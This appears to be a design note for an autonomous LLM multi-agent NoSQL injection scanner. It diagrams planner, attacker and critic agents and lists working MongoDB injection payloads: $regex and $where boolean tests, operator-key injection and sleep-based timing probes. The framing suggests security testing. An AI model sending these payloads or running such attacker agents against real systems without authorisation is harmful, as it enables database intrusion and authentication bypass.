+--------------------+
|        START       |
+--------------------+
          |
          v
+--------------------------------------+
|  Scanner Input Structurer (LLM)       |
|--------------------------------------|
| Inputs:                              |
|  - Target URL                        |
|  - Goal                              |
|  - Website Scrape (HTML)             |
| Outputs:                             |
|  - entry_point                       |
|  - fields                            |
+--------------------------------------+
          |
          v
+--------------------------------------+
|  Manual NoSQL Scanner (Tool)         |
|--------------------------------------|
| ScanForNoSQLITool                    |
| Outputs:                             |
|  - manual_scan_report                |
+--------------------------------------+
          |
          v
+--------------------------------------+
|  Planner Agent (LLM)                 |
|--------------------------------------|
| Inputs:                              |
|  - scan report                       |
|  - goal                              |
| Outputs:                             |
|  - endpoint                          |
|  - 5 NoSQLi payloads                 |
+--------------------------------------+
          |
          v
+--------------------------------------+
|  Attacker Agent                      |
|--------------------------------------|
| Sends HTTP POST requests             |
| Executes payloads                    |
| Outputs:                             |
|  - attack_results                    |
+--------------------------------------+
          |
          v
+--------------------------------------+
|  Critic Agent (LLM)                  |
|--------------------------------------|
| Evaluates results                    |
| Tracks iteration count               |
| Decision:                            |
|  - rescan                            |
|  - replan                            |
|  - success                           |
|  - failure                           |
+--------------------------------------+
     |           |            |
     |           |            |
     |           |            v
     |           |     +--------------------+
     |           |     | Report Writer (LLM)|
     |           |     |--------------------|
     |           |     | Final JSON Report  |
     |           |     +--------------------+
     |           |              |
     |           |              v
     |           |        +-----------+
     |           |        |   END     |
     |           |        +-----------+
     |           |
     |           v
     |     +----------------------+
     |     | Planner Agent (LLM)  |
     |     |  (replan path)       |
     |     +----------------------+
     |
     v
+----------------------+
| Manual Scanner       |
|  (rescan path)       |
+----------------------+




--------------------------


```mermaid
flowchart TD
    A[run()] --> B[Build AttackObject]
    B --> C[Load / Init ScanState]

    C --> D{Current Stage}

    D -->|error| E[Error‑Based Tests]
    E -->|found| R1[Return Injection + Updated State]
    E -->|none| D2[Advance → Boolean]

    D2 -->|boolean| F[Blind Boolean Tests]
    F -->|found| R2[Return Injection + Updated State]
    F -->|none| D3[Advance → Timing]

    D3 -->|timing| G[Timing‑Based Tests]
    G -->|found| R3[Return Injection + Updated State]
    G -->|none| H[Complete Scan]
```


Error → Boolean → Timing → Complete


## Error‑Based Injection Payloads

### Payload sources

| Type               | Payload Examples            |
| ------------------ | --------------------------- |
| Special characters | `'` `"` `$` `.` `>` `[` `]` |
| Key injection      | `[$]`                       |
| Invalid JSON       | `{ "foo": 1 }`              |

### Example payloads

```
?username='
?username[$]=test
```

**Detection signal**

* MongoDB errors
* Mongoose cast errors
* JS syntax errors

---

## 5. Blind Boolean Injection Payloads

Blind injections rely on **response comparison**, not errors.

### Core logic

Send TRUE and FALSE payloads, and compare output
---

### 5.1 Regex‑Based Mongo Injection

**True / False primitives**
```
TRUE  = .*
FALSE = a^
```

**Injected as**

```
param[$regex]=.*
param[$regex]=a^
```

---

### 5.2 JavaScript Expression Injection

Generated via nested iteration

**Prefixes**

```
"" , ' , "
```

**True expressions**

```
&& 'a'=='a'
|| 'a'=='a'
;return true;
```

**False expressions**

```
&& 'a'!='a'
;return false;
```

**Suffixes**

```
"" , ' , " , // , '}//
```
**True objects**

```json
{"$where": "return true"}
{"$or": [{}, {"foo": "1"}]}
```

**False objects**

```json
{"$where": "return false"}
{"$or": [{"foo": "1"}, {"foo": "1"}]}
```

---

## Timing‑Based Injection Payloads

Timing attacks rely on **statistical delay detection**.

First, Send Baseline Request x3
Check Delay > sleep && > mean+2σ?
If Yes: Timing Injection Found

### Timing payload examples

```
;sleep(500);
{"$where": "sleep(500)"}
id=1';sleep(500);//
```


### Scan State Saving & Resumption

```go
type ScanState struct {
    Stage           string   // error | boolean | timing | complete
    SubStage        string   // (unused)
    CompletedStages []string
}
---

On Injection found: early return


**returned JSON example**

```json
{
  "injection": { ... },
  "state": {
    "stage": "timing",
    "completed_stages": ["error", "boolean"]
  },
  "complete": false
}
```

